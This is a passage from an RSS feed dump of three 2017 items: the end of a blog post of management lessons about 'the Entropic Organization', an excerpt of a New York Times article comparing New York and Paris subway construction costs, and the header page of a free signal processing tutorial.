&lt;p&gt;&lt;strong&gt;23.&lt;/strong&gt;  There’s more and more good content to read and absorb on effective organizations. Don’t despair and don’t stop reading.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;24.&lt;/strong&gt;  Don’t let entropy get at your daily routine. Avoid entropy-driven work.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;25.&lt;/strong&gt;  Ask questions to people in order to make sure they understand. Trust people who do the same to you. “Do you understand?” is NOT a valid question.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;26.&lt;/strong&gt;  Avoid having people waiting on you. Don’t create direct dependencies on your work or decisions, make sure people feel that they can take decisions and still stay true to the vision without referring to you (hence the importance of point 1).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;27.&lt;/strong&gt;  Take the time to coach people in depth. Really, spend time with the people who are or have the potential to be great professionals in the organisation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;28.&lt;/strong&gt;  The time you spend with the people you see most potential in is endorsement enough. Avoid any other kind of endorsement of individuals. Unless you are leaving.&lt;/p&gt;
&lt;h4&gt;The Entropic Organization&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;29.&lt;/strong&gt;  An organization populated by a majority of incompetents has less than zero net-worth : it is able to destroy other adjacent organizations that are not similarly populated.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;30.&lt;/strong&gt;  Incompetence is fiercely gregarious while knowledge is often fractious; the reason for this is that raw ideas transfer more easily through untrained minds than refined ideas transfer through trained minds. There’s a reason why large organisations focus so much on simple messages, pity that difficult problems often have simple solutions that don’t work.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;31.&lt;/strong&gt;  Entropy self-selects. Hierarchical  and other kinds of entropic organizations always favor solutions that survive within entropic organizations. Thus they will favor easy over simple, complex over difficult, responsibility-dilution over empowerment, accountability over learning, shock-therapy over culture-nurturing. This is the reinforcing loop that brings ever-increasing entropy in the system : entropy generates easy decisions with complex and broken implementations, which in turn generate more entropy. An example of easy decision with a complexity-inducing implementation: this scenario “our company does not have a coherent strategy, as such many projects tend to deliver results that are not coherent, hampering the organic growth of our capabilities.” will be answered by the most classic knee-jerk decision-making pattern “we don’t know how to do X, so let’s overlay a new Y to enforce X”, in this case :”Group together strategic projects into a big strategic program that will ensure coherence”. The difficult but simple option will not even be entertained : “let’s discover our real strategy and shape the organization around it.”&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;32.&lt;/strong&gt;  Delivery dates have often irrelevant but very simple to understand impacts. Good and bad solutions have dramatic but very difficult to understand impacts. The Entropic Organization will thus tend to make date-based decisions. The Entropic Organization will always worry about the development organization ability to deliver by a given date, never about the ability to find the right solution. There are some very rare cases where delivery date is more important than what you are delivering, but modern management seems to delight in generalizing this unusual occurrence to every situation. People do get promoted for having been able to deliver completely broken, useless and damaging solutions on time. If that’s the measure of project success you can expect dates to rule (even when they continuously slide). After all, if you are not a trained surgeon, and the only thing you are told is that a given surgery should last no more than X hours, guess what will be the one criterium for all your actions during the operation. This showcases the direct link between the constituents incompetence and the establishment of classic Entropic Organization decision-making.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;33.&lt;/strong&gt;  Having a strategy will only go so far when you face the Entropic Organization, since it will be only able to appropriate that strategy at the level of energy (understanding) they can attain, which, being entropic, is very low. This results in something that does not look like a strategy at all : ever seen a two-years old play air-traffic control? He got the basic understanding of “talking to planes”, but that’s it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;34.&lt;/strong&gt;  Partially isolating the Development Organization to stay effective does not work. Adapting your organization to be accepted by an incompetent background does not work either. What is left in the scope of alternatives is radical isolation supported by the attempt to radical results and crossing fingers for top-management recognition (also known as `Deux-ex-machina for the worthy’) and the top-down sales-pitch (or POC) to the CEO (also known as “He who has the ear of the King…”). But don’t forget : Nemo propheta in patria, so, act and look like an outsider as long as you can.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;35.&lt;/strong&gt;  Growth-shrink symmetry. When an organization grows unhealthily (too fast, for bad reasons or through bad recruitment) it will also shrink unhealthily. When it grows it’s bold and confused, when it shrinks it’s scared and nasty.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;36.&lt;/strong&gt;  Most of the ideas that will pop up naturally from the Entropic Organization are bad in the context of modern knowledge-based work, but possess a superficial layer of common-sense to slide through. Exercise extreme prejudice.&lt;/p&gt;
&lt;div class=&quot;wpcnt&quot;&gt;
&lt;div class=&quot;wpa wpmrec&quot;&gt;&lt;span class=&quot;wpa-about&quot;&gt;Advertisements&lt;/span&gt;



&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;jp-post-flair&quot; class=&quot;sharedaddy sd-like-enabled&quot;&gt;
&lt;div class=&quot;sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded&quot; id=&quot;like-post-wrapper-1748234-633-5a474783a8879&quot; data-src=&quot;//widgets.wp.com/likes/#blog_id=1748234&amp;amp;post_id=633&amp;amp;origin=minnenratta.wordpress.com&amp;amp;obj_id=1748234-633-5a474783a8879&quot; data-name=&quot;like-post-frame-1748234-633-5a474783a8879&quot;&gt;
&lt;h3 class=&quot;sd-title&quot;&gt;Like this:&lt;/h3&gt;
&lt;div class=&quot;likes-widget-placeholder post-likes-widget-placeholder&quot;&gt;&lt;span class=&quot;button&quot;&gt;&lt;span&gt;Like&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;loading&quot;&gt;Loading...&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
</description>
<pubDate>Fri, 29 Dec 2017 08:41:08 +0000</pubDate>
<dc:creator>kuahyeow</dc:creator>
<og:type>article</og:type>
<og:title>Things I have learnt as the software engineering lead of a multinational</og:title>
<og:url>https://minnenratta.wordpress.com/2017/01/25/things-i-have-learnt-as-the-software-engineering-lead-of-a-multinational/</og:url>
<og:description>A surprisingly long cycle has just closed for me and I think it’s a good time to share some lessons learned. I have been collecting these points in the last six months, but none of them poppe…</og:description>
<og:image>https://secure.gravatar.com/blavatar/63f35284b49b23f75a789ea3b97cf228?s=200&amp;ts=1514620803</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://minnenratta.wordpress.com/2017/01/25/things-i-have-learnt-as-the-software-engineering-lead-of-a-multinational/</dc:identifier>
</item>
<item>
<title>The Most Expensive Mile of Subway Track</title>
<link>https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html</link>
<guid isPermaLink="true" >https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html</guid>
<description>&lt;h4 class=&quot;story-subheading story-content&quot; data-para-count=&quot;25&quot; data-total-count=&quot;19106&quot;&gt;Swelling ‘Soft’ Costs&lt;/h4&gt;&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;151&quot; data-total-count=&quot;19257&quot; id=&quot;story-continues-22&quot;&gt;The M.T.A.’s high costs are not limited to the companies that build the tunnels. Projects start burning through cash long before construction begins.&lt;/p&gt;
&lt;div id=&quot;story-ad-9&quot; class=&quot;story-ad ad ad-placeholder nocontent robots-nocontent&quot;&gt;

&lt;a class=&quot;visually-hidden skip-to-text-link&quot; href=&quot;https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html#story-continues-23&quot;&gt;Continue reading the main story&lt;/a&gt;&lt;/div&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;314&quot; data-total-count=&quot;19571&quot; id=&quot;story-continues-23&quot;&gt;On average, “soft costs” — preliminary design and engineering, plus management while construction is underway — make up about 20 percent of the cost of transit projects in America, according to a 2010 report by the Transportation Research Board. The average is similar in other countries, contractors said.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;16&quot; data-total-count=&quot;19587&quot;&gt;Not in New York.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;326&quot; data-total-count=&quot;19913&quot;&gt;The latest federal oversight report for the Second Avenue subway projected soft cost spending at $1.4 billion — one-third of the budget, not including financing expenses. M.T.A. officials said that number was high because it included some costs for design of later phases of the line. But experts said it was still shocking.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;243&quot; data-total-count=&quot;20156&quot;&gt;“The crazy thing is it’s so high even with everything else,” said Larry Gould, a transit consultant and former M.T.A. subway planner. “If we have three or four times as many workers, how can the percentage for soft costs be so high?”&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;204&quot; data-total-count=&quot;20360&quot;&gt;Soft costs for East Side Access are expected to exceed $2 billion. The project plan called for the hiring of 500 consultants from a dozen different companies, according to a 2009 federal oversight report.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;388&quot; data-total-count=&quot;20748&quot;&gt;Both the Second Avenue subway and East Side Access projects hired the same main engineering firm: WSP USA, formerly known as Parsons Brinckerhoff. The firm, which designed some of New York’s original subway, has donated hundreds of thousands to politicians in recent years, and has hired so many transit officials that some in the system refer to it as “the M.T.A. retirement home.”&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;320&quot; data-total-count=&quot;21068&quot;&gt;The firm was the only vendor to bid on the engineering contract for the Second Avenue subway, records show. On East Side Access, it is sharing the contract with STV Inc., which recently hired the former M.T.A. chairman Thomas F. Prendergast. The contract was initially for $140 million, but it has grown to $481 million.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;216&quot; data-total-count=&quot;21284&quot;&gt;WSP USA declined to answer questions. “WSP has undertaken complex and enduring infrastructure projects across the U.S., and the New York region presents unique needs and challenges,” the firm said in a statement.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;473&quot; data-total-count=&quot;21757&quot;&gt;The M.T.A. is partly to blame. Officials have added to the soft costs by struggling to coordinate between vendors, taking a long time to approve plans, insisting on extravagant station designs and changing their minds midway through projects. In 2010, they hired a team of three consultants to work full time on East Side Access “operational readiness” — getting the tunnel ready to open — even though contractors knew construction would not end for another decade.&lt;/p&gt;
&lt;div id=&quot;story-ad-10&quot; class=&quot;story-ad ad ad-placeholder nocontent robots-nocontent&quot;&gt;

&lt;a class=&quot;visually-hidden skip-to-text-link&quot; href=&quot;https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html#story-continues-24&quot;&gt;Continue reading the main story&lt;/a&gt;&lt;/div&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;350&quot; data-total-count=&quot;22107&quot; id=&quot;story-continues-24&quot;&gt;Janno Lieber, who joined the M.T.A. as chief development officer in April, acknowledged there were parts of the authority’s project management approach that have been “broken” and “self-defeating.” Changing plans midway through projects is a “huge issue,” as is over-customization of designs and poor management of consultants, he said.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;174&quot; data-total-count=&quot;22281&quot;&gt;“We just have to do a much better job,” Mr. Lieber said. “We’re relying on these consultants to run our projects, and we’re not getting good results out of them.”&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;62&quot; data-total-count=&quot;22343&quot;&gt;Others have a more skeptical perspective about the soft costs.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;255&quot; data-total-count=&quot;22598&quot;&gt;Jack Brockway, an executive at Herrenknecht, a German manufacturer of tunnel-boring machines, said he got “stacks and stacks and stacks” of instructions from consultants for his work on the Second Avenue subway, down to details that barely made sense.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;160&quot; data-total-count=&quot;22758&quot;&gt;“It makes you wonder if it’s really necessary, or if they’re just trying to do something to justify how much they’re getting paid,” Mr. Brockway said.&lt;/p&gt;
&lt;span class=&quot;visually-hidden&quot;&gt;Photo&lt;/span&gt;
&lt;div class=&quot;image&quot;&gt;&lt;img src=&quot;https://static01.nyt.com/images/2017/12/29/nyregion/29subway10/29subway10-master1050.jpg&quot; alt=&quot;&quot; class=&quot;media-viewer-candidate&quot; data-mediaviewer-src=&quot;https://static01.nyt.com/images/2017/12/29/nyregion/29subway10/29subway10-superJumbo.jpg&quot; data-mediaviewer-caption=&quot;Workers at a new Metro station in Paris in December. Despite France&amp;#x2019;s strong unions, Paris has lower subway construction costs than New York City because of more efficient staffing, fierce vendor competition and scant use of consultants.&quot; data-mediaviewer-credit=&quot;Pete Kiehart for The New York Times&quot; itemprop=&quot;url&quot; itemid=&quot;https://static01.nyt.com/images/2017/12/29/nyregion/29subway10/29subway10-master1050.jpg&quot;/&gt;&lt;/div&gt;
&lt;span class=&quot;caption-text&quot;&gt;Workers at a new Metro station in Paris in December. Despite France’s strong unions, Paris has lower subway construction costs than New York City because of more efficient staffing, fierce vendor competition and scant use of consultants.&lt;/span&gt; &lt;span class=&quot;credit&quot; itemprop=&quot;copyrightHolder&quot;&gt;&lt;span class=&quot;visually-hidden&quot;&gt;Credit&lt;/span&gt; Pete Kiehart for The New York Times&lt;/span&gt;
&lt;h4 class=&quot;story-subheading story-content&quot; data-para-count=&quot;19&quot; data-total-count=&quot;22777&quot;&gt;The View From Paris&lt;/h4&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;116&quot; data-total-count=&quot;22893&quot;&gt;Across the Atlantic Ocean, Paris is working on a project that brings the inefficiency of New York into stark relief.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;508&quot; data-total-count=&quot;23401&quot;&gt;The project, called the Line 14 extension, is similar to the Second Avenue subway. Both projects extend decades-old lines in the hopes of reducing systemwide overcrowding. Both involved digging through moderately hard soil just north of the city center to make a few miles of tunnel and a few stations about 80 feet underground. Both used tunnel-boring machines made by Herrenknecht. Both faced strict regulations, high density and demands from neighbors, which limited some construction to 12 hours per day.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;123&quot; data-total-count=&quot;23524&quot;&gt;But while the Second Avenue Subway cost $2.5 billion a mile, the Line 14 extension is on track to cost $450 million a mile.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;121&quot; data-total-count=&quot;23645&quot;&gt;On a recent afternoon at a Line 14 construction site, an official expressed disbelief that New York was spending so much.&lt;/p&gt;
&lt;div id=&quot;story-ad-11&quot; class=&quot;story-ad ad ad-placeholder nocontent robots-nocontent&quot;&gt;

&lt;a class=&quot;visually-hidden skip-to-text-link&quot; href=&quot;https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html#story-continues-25&quot;&gt;Continue reading the main story&lt;/a&gt;&lt;/div&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;151&quot; data-total-count=&quot;23796&quot; id=&quot;story-continues-25&quot;&gt;“We thought ours was expensive,” said Laurent Probst, managing director of Île-de-France Mobilités, which controls transit in the French capital.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;288&quot; data-total-count=&quot;24084&quot;&gt;As he descended into the hole carved for the future Pont Cardinet station, it became clear how the costs could be so different. Scattered around the cavern were a couple dozen workers, running drills, smoothing over soil and checking electrical systems. Mostly, they worked by themselves.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;126&quot; data-total-count=&quot;24210&quot;&gt;Mr. Probst, 39, wearing a suit and blue tie under his orange safety jacket, pushed the button to operate the elevator himself.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;416&quot; data-total-count=&quot;24626&quot;&gt;France’s unions are powerful, but Mr. Probst said they did not control project staffing. Isabelle Brochard of RATP, a state-owned company that operates the Paris Metro and is coordinating the Line 14 project, estimated there were 200 total workers on the job, each earning $60 per hour. The Second Avenue subway project employed about 700 workers, many making double that (although that included health insurance).&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;236&quot; data-total-count=&quot;24862&quot;&gt;The tunnel-boring machine chewing through dirt north of Pont Cardinet — a secondhand machine, Ms. Brochard noted — was staffed by a dozen laborers who bounced between the control room, the cutting wheel and the sides of the machine.&lt;/p&gt;
&lt;a class=&quot;visually-hidden skip-to-text-link&quot; href=&quot;https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html#story-continues-26&quot;&gt;Continue reading the main story&lt;/a&gt;</description>
<pubDate>Fri, 29 Dec 2017 02:28:37 +0000</pubDate>
<dc:creator>seibelj</dc:creator>
<og:url>https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html</og:url>
<og:type>article</og:type>
<og:title>The Most Expensive Mile of Subway Track on Earth</og:title>
<og:description>How excessive staffing, little competition, generous contracts and archaic rules dramatically inflate capital costs for transit in New York.</og:description>
<og:image>https://static01.nyt.com/images/2017/12/29/nyregion/29subway1/29subway1-facebookJumbo.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html</dc:identifier>
</item>
<item>
<title>A Pragmatic  Introduction  to Signal Processing</title>
<link>https://terpconnect.umd.edu/~toh/spectrum/</link>
<guid isPermaLink="true" >https://terpconnect.umd.edu/~toh/spectrum/</guid>
<description>&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;&lt;title&gt;Introduction to Signal Processing: Table of Contents&lt;/title&gt;&lt;meta name=&quot;Description&quot; content=&quot;Introduction to Signal Processing in Analytical Chemistry&quot;/&gt;&lt;meta name=&quot;Keywords&quot; content=&quot;signal processing analytical chemistry spectroscopy tutorial best fast easy free&quot;/&gt;&lt;/head&gt;&lt;body id=&quot;readabilityBody&quot; readability=&quot;93.825746034591&quot;&gt;
&lt;center readability=&quot;18.82777276826&quot;&gt;


&lt;h2&gt; with applications in scientific measurement&lt;br/&gt;&lt;/h2&gt;
&lt;h3&gt;An illustrated essay with free software to download&lt;/h3&gt;
&lt;span&gt;This is a work in progress, last updated&lt;/span&gt; &lt;span&gt;&lt;span&gt;December 24&lt;/span&gt;, 2017.&lt;/span&gt; &lt;big&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/RecentlyChangedFiles.png&quot;&gt;(Recently updated files)&lt;/a&gt;&lt;/big&gt;
&lt;p&gt;&lt;big&gt;A &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Retirement.pdf&quot;&gt;retirement project&lt;/a&gt; by &lt;a href=&quot;http://terpconnect.umd.edu/%7Etoh/&quot;&gt;Tom O'Haver&lt;/a&gt; , Professor Emeritus&lt;br/&gt;Department of Chemistry and Biochemistry&lt;br/&gt;University of Maryland at College Park&lt;br/&gt;Have a question or suggestion? E-mail me: &lt;a href=&quot;mailto:toh@umd.edu?subject=Index%20to%20Signal%20Processing&quot;&gt;toh@umd.edu&lt;/a&gt;&lt;br/&gt;Join our group on &lt;a href=&quot;https://www.facebook.com/groups/237474013116361/&quot;&gt;Facebook&lt;/a&gt;&lt;/big&gt;&lt;br/&gt;&lt;em&gt;&lt;br/&gt;No cost, no&lt;/em&gt; &lt;em&gt;ads,&lt;/em&gt; &lt;em&gt;no sign-in/registration, no eye candy, no frames, no hype, no Java, no Flash, no kidding. Completely free since 1993.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;big&gt;&lt;strong&gt;This essay&lt;/strong&gt; &lt;strong&gt;is also available as a&lt;/strong&gt; &lt;strong&gt;150-page, &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.pdf#page=148&quot;&gt;&lt;em&gt;indexed&lt;/em&gt;&lt;/a&gt;, printable document&lt;/strong&gt; &lt;strong&gt;written in OpenOffice and saved in&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.odt&quot;&gt;Open Document&lt;/a&gt;*&lt;/strong&gt;&lt;strong&gt;*&lt;/strong&gt; &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.odt&quot;&gt;&lt;strong&gt;&lt;img alt=&quot;&quot; title=&quot;Download OpenOffice version&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/OOicon.GIF&quot; align=&quot;middle&quot;/&gt;&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;, &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.doc&quot;&gt;Word&lt;/a&gt;   &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.doc&quot;&gt;&lt;img alt=&quot;&quot; title=&quot;Download Word version&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/Wordicon.GIF&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt;, and &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.pdf&quot;&gt;PDF&lt;/a&gt; &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.pdf&quot;&gt;&lt;img src=&quot;https://terpconnect.umd.edu/~toh/spectrum/PDFicon.GIF&quot; title=&quot;Download Adobe Acrobat PDF version&quot; alt=&quot;&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt; formats.&lt;/strong&gt; &lt;/big&gt;&lt;strong&gt;&lt;span&gt;December 24&lt;/span&gt;&lt;/strong&gt;&lt;big&gt;&lt;strong&gt;,&lt;/strong&gt; &lt;strong&gt;2017 version.&lt;/strong&gt; &lt;span&gt;&lt;span class=&quot;Apple-converted-space&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Readability.txt&quot;&gt;Readability index&lt;/a&gt;&lt;/big&gt;&lt;br/&gt;&lt;big&gt;A paperback printed version is available from Amazon CreateSpace in &lt;a href=&quot;https://www.amazon.com/Pragmatic-Introduction-Signal-Processing-applications/dp/153335491X/ref=sr_1_1?ie=UTF8&amp;amp;qid=1467636882&amp;amp;sr=8-1&amp;amp;keywords=A+Pragmatic+Introduction+to+Signal+Processing&quot;&gt;black-and-white ($11.00 US)&lt;/a&gt; and in &lt;a href=&quot;https://www.createspace.com/6290279&quot;&gt;color ($30.00 US).&lt;/a&gt;&lt;br/&gt;This entire web site can be downloaded in archived &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/SPECTRUM.zip&quot;&gt;HTML&lt;/a&gt; format complete with &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/functions.html&quot;&gt;all linked software&lt;/a&gt; (150 MBytes).&lt;/big&gt; &lt;big&gt;&lt;strong&gt;&lt;br/&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Countries.html&quot;&gt;Who uses this site?&lt;/a&gt;&lt;/strong&gt; &lt;strong&gt;  &lt;/strong&gt; &lt;strong&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/#comments&quot;&gt;Feedback from users&lt;/a&gt;&lt;/strong&gt;&lt;/big&gt; &lt;big&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/#comments&quot;&gt;&lt;big&gt;&lt;big&gt;&lt;img alt=&quot;&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/updated.gif&quot; width=&quot;44&quot; height=&quot;12&quot; border=&quot;0&quot;/&gt;&lt;/big&gt;&lt;/big&gt;&lt;/a&gt;  &lt;strong&gt;Site search:&lt;/strong&gt;&lt;/big&gt;&lt;br/&gt;&lt;/p&gt;

&lt;/center&gt;
&lt;div align=&quot;center&quot; readability=&quot;6.5573770491803&quot;&gt;
&lt;p&gt;* Pragmatic: Relating to matters of fact or practical affairs, often to the exclusion of intellectual or artistic matters; practical as opposed to idealistic.&lt;br/&gt;** What is Open Document format? See &lt;a href=&quot;http://www.coolutils.com/Formats/ODT&quot;&gt;http://www.coolutils.com/Formats/ODT&lt;/a&gt;&lt;/p&gt;


&lt;/div&gt;


&lt;div&gt;


&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/#Top&quot;&gt;&lt;big&gt;&lt;big&gt;&lt;big&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://terpconnect.umd.edu/~toh/spectrum/btt.png&quot; title=&quot;Back to top of this page.&quot; alt=&quot;&quot; width=&quot;50&quot; height=&quot;50&quot; border=&quot;0&quot; align=&quot;right&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/big&gt;&lt;/big&gt;&lt;/big&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;hr width=&quot;100%&quot; size=&quot;2&quot;/&gt;&lt;h2&gt;Software used in this essay&lt;br/&gt;&lt;/h2&gt;
&lt;span&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Matlab.gif&quot;&gt;&lt;img src=&quot;https://terpconnect.umd.edu/~toh/spectrum/Matlab.gif&quot; alt=&quot;&quot; width=&quot;386&quot; vspace=&quot;5&quot; hspace=&quot;5&quot; height=&quot;219&quot; border=&quot;2&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;br/&gt;&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/SignalArithmetic.html#Matlab&quot;&gt;Matlab&lt;/a&gt;, a high-performance commercial numerical computing environment and programming language that is widely used in research and education, for Windows, Macintosh, and Linux.&lt;/h3&gt;
&lt;/div&gt;
&lt;hr/&gt;&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Octave.gif&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/Octave.gif&quot; width=&quot;377&quot; height=&quot;203&quot; border=&quot;2&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt;  &lt;/h3&gt;
&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/SignalArithmetic.html#Octave&quot;&gt;Octave&lt;/a&gt;, a free alternative to Matlab, mostly compatible, for Windows, Macintosh, and Linux.&lt;/h3&gt;
&lt;hr/&gt;&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/SPECTRUMScreenShot.GIF&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/SPECTRUMScreenShot.GIF&quot; width=&quot;273&quot; height=&quot;209&quot; border=&quot;2&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt;  &lt;/h3&gt;
&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/SPECTRUM.html&quot;&gt;SPECTRUM&lt;/a&gt;, &lt;span&gt;simple, freeware, 90s-era signal processing program, for&lt;/span&gt; Macintosh OS 8.&lt;/h3&gt;
&lt;hr width=&quot;100%&quot; size=&quot;2&quot;/&gt;&lt;div align=&quot;center&quot;&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/MultipleSmoothingExcel.png&quot;&gt;&lt;img alt=&quot;Click to enlarge&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/MultipleSmoothingExcel.png&quot; width=&quot;226&quot; height=&quot;219&quot; border=&quot;2&quot; align=&quot;middle&quot;/&gt;   &lt;/a&gt; &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/MultipleSmoothingCalc.png&quot;&gt;&lt;img alt=&quot;Click to enlarge&quot; title=&quot;Click to enlarge&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/MultipleSmoothingCalc.png&quot; width=&quot;251&quot; height=&quot;219&quot; border=&quot;2&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt;&lt;br/&gt;&lt;h3&gt;&lt;strong&gt;Microsoft Excel 2013                    OpenOffice Calc 4.1.1&lt;br/&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;/div&gt;
&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/#Top&quot;&gt;&lt;big&gt;&lt;big&gt;&lt;big&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://terpconnect.umd.edu/~toh/spectrum/btt.png&quot; title=&quot;Back to top of this page.&quot; alt=&quot;&quot; width=&quot;50&quot; height=&quot;50&quot; border=&quot;0&quot; align=&quot;right&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/big&gt;&lt;/big&gt;&lt;/big&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;hr/&gt;&lt;h3&gt;&lt;big&gt;Unsolicited Comments from Users:&lt;/big&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;big&gt;&quot; &lt;span&gt;It is the best source in the entire internet&lt;/span&gt; with such a detailed information, description, examples and theory provided on programmatic realization of peak related techniques and analysis. &quot;&lt;/big&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;big&gt;&quot;...the most &lt;span&gt;understandable&lt;/span&gt; documentation I’ve ever encountered!&quot;&lt;/big&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;&lt;big&gt;&quot;&lt;/big&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&lt;big&gt;It is as good as, if not &lt;span&gt;better than, any similar books available&lt;/span&gt; in the market&quot;.&lt;/big&gt;&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;
&lt;h4&gt;&lt;big&gt;&quot;...a &lt;span&gt;clear, organized, accessible, and intuitive&lt;/span&gt; resource....&quot;&lt;/big&gt;&lt;/h4&gt;
